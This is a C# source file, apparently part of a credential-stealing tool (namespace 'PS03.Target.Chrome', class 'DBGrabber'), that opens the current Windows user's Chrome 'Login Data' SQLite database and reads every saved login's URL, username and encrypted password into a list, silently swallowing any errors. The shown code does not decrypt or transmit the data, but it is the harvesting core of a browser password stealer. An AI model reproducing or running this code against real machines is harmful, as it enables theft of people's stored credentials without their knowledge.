using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PS03.Target.Chrome
{
    class DBGrabber
    {
        private readonly SQLiteConnection dbcon;

        public DBGrabber()
        {
            var user = Environment.UserName;
            var path = "C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default";
            var constring = @"Data Source=" + path + "/Login Data;Version=3";
            dbcon = new SQLiteConnection(constring);

            try
            {
                dbcon.Open();
            }
            catch (Exception)
            {
                return;
            }
        }

        public List<Profile> GetProfiles()
        {
            var ProfileList = new List<Profile>();

            var sql = "SELECT action_url, username_value, password_value FROM logins";
            var command = new SQLiteCommand(sql, dbcon);
            try
            {
                var reader = command.ExecuteReader();
                while (reader.Read())
                {
                    var dataprofile = new Profile();
                    dataprofile.Action = reader["action_url"].ToString();
                    dataprofile.Specification = reader["username_value"].ToString();
                    dataprofile.encPassword = (byte[])(reader["password_value"]);
                    ProfileList.Add(dataprofile);
                }
                return ProfileList;
            }
            catch (Exception)
            {
                return new List<Profile>();
            }

        }
    }
}
